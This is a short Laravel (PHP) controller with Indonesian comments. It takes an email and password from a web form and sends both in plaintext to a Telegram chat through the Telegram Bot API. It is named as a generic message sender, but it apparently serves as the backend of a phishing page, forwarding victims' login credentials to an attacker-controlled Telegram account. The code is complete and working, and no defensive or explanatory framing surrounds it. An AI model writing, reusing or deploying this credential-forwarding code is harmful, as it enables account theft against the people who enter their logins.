<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use GuzzleHttp\Client;

class TelegramBotController extends Controller
{
    public function sendMessage(Request $request)
    {
        // Validasi input form
        $request->validate([
            'email' => 'required|email',
            'password' => 'required|string',
        ]);

        $email = $request->input('email');
        $password = $request->input('password');

        $telegramToken = env('TELEGRAM_BOT_TOKEN'); // Simpan di .env
        $chatId = env('TELEGRAM_CHAT_ID');         // Simpan di .env
        $text = "Pesan Baru:\n\n"
            . "*Email*: $email\n"
            . "*Password*: $password";

        $client = new Client();
        $url = "https://api.telegram.org/bot$telegramToken/sendMessage";

        try {
            $response = $client->post($url, [
                'json' => [
                    'chat_id' => $chatId,
                    'text' => $text,
                    'parse_mode' => 'Markdown',
                ],
            ]);

            if ($response->getStatusCode() === 200) {
                return back()->with('success', 'Pesan berhasil dikirim!');
            }
        } catch (\Exception $e) {
            return back()->with('error', 'Gagal mengirim pesan: ' . $e->getMessage());
        }
    }
}
